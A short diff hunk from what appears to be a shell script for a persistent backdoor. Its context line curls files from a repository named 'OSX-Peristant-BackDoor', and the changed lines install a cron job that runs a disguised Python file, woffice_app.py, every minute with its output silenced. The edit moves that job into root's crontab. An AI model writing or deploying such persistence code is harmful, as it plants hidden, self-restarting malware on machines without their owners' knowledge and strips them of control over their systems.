@@ -8,4 +8,4 @@ curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/mast
 #croncmd="/etc/init.d/rc.local"
 croncmd="python /usr/local/sbin/woffice_app.py > /dev/null"
 cronjob="* * * * * $croncmd"
-(crontab -l | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -
+(crontab -l -u root | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -u root -
